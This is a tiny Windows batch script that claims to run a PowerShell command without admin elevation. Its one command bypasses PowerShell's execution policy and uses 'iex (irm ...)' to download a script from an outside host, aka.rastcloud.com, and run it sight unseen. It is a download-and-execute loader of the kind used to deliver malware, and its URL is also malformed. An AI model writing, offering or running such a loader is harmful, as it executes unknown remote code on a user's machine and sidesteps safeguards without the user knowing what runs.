@echo off
:: Batch script to run PowerShell command without admin elevation

powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm ://aka.rastcloud.com)"

pause